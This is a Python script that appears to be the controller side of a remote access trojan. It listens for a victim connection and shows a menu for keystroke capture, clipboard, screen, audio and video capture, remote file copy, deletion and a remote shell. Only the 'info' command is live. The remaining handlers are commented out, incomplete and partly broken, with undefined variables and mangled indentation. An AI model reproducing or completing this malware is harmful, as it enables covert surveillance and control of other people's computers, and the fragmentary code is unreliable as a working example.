
#*********************************************************************

#import socket
import socket
import threading

#*********************************************************************

def interface_command():

	print("\nCommand interface:\n")

	print("\t[info] System Information Discovery;\n")
	print("\t[cmd] Command-Line Interface;\n")
	print("\t[files] File and Directory Discovery;\n")
	print("\t[copy] Remote File Copy;\n")
	print("\t[delite] File Deletion;\n")
	print("\t[process] Process Discovery;\n")
	print("\t[get_input] Input Capture;\n")
	print("\t[get_clipboard] Clipboard Data;\n")
	print("\t[get_screen] Screen Capture;\n")
	print("\t[get_audio] Audio Capture;\n")
	print("\t[get_video] Video Capture;\n")
	print("\t[exit] Exit and End.\n")

	print("\nInput comannd only in brackets.\n")


#*********************************************************************

def main():
	#Get host and port
	host = input("\nHost: ")
	port = int(input("Port: "))

	#Create new server socket
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind((host, port))
	sock.listen(1)
	conn, addr = sock.accept()
	
	#check the socket conection
	print("Connected:", addr)
	interface_command()

	#executing command
	
	print("\nInput your command:\n")
	
	temp=True
	
	while temp:
	
		command=input(">")
		
		if command=="info":
			conn.send(command.encode())
			continue
		
		elif command=="exit":
			print("\nClose the connection and exit for the program.\n")
			temp=False
			break


	#close the session
	conn.close()   

main()
#*********************************************************************

	


# def read(conn,size):
# 	buf=b""
# 	while len(buf)!=size :
# 		buf += conn.recv(size-len(buf))

# def file_receive():
# 	# receive the file infos
# 	# receive using client socket, not server socket
# 	received = client_socket.recv(BUFFER_SIZE).decode()
# 	filename, filesize = received.split(SEPARATOR)
# 	# remove absolute path if there is
# 	filename = os.path.basename(filename)
# 	# convert to integer
# 	filesize = int(filesize)
	
# 	# start receiving the file from the socket
# 	# and writing to the file stream
# 	progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
# 	with open(filename, "wb") as f:
# 	    while True:
# 		# read 1024 bytes from the socket (receive)
# 		bytes_read = client_socket.recv(BUFFER_SIZE)
# 		if not bytes_read:    
# 		    # nothing is received
# 		    # file transmitting is done
# 		    break
# 		# write to the file the bytes we just received
# 		f.write(bytes_read)
# 		# update the progress bar
# 		progress.update(len(bytes_read))

# elif command=="cmd":
# 			conn.send(command.encode())
# 			continue
# 	    elif command=="files":
# 			conn.send(command.encode())
# 			#length=read(command)
# 			continue
# 	    elif command=="copy":
# 			conn.send(command.encode())
# 			#length=read(conn,4)
# 			continue
# 	    elif command=="delite":
# 			conn.send(command.encode())
# 			#length=read(conn,4)
# 			continue
# 	    elif command=="process":
# 			conn.send(command.encode())
# 			#length=read(conn,4)
# 			continue
# 	    elif command=="get_input":
# 			conn.send(command.encode())
# 			#length=read(conn,4)
# 			continue
# 	    elif command=="get_clipboard":
# 			conn.send(command.encode())
# 			#length=read(conn,4)
# 			continue
# 	    elif command=="get_screen":
# 			conn.send(command.encode())
# 			#length=read(conn,4)
# 			continue
		 
# 	    elif command=="get_audio":
# 			conn.send(command.encode())
# 			#length=read(conn,4)
# 			continue
		 
# 	    elif command=="get_video":
# 			conn.send(command.encode())
# 			#length=read(conn,4)
# 			continue
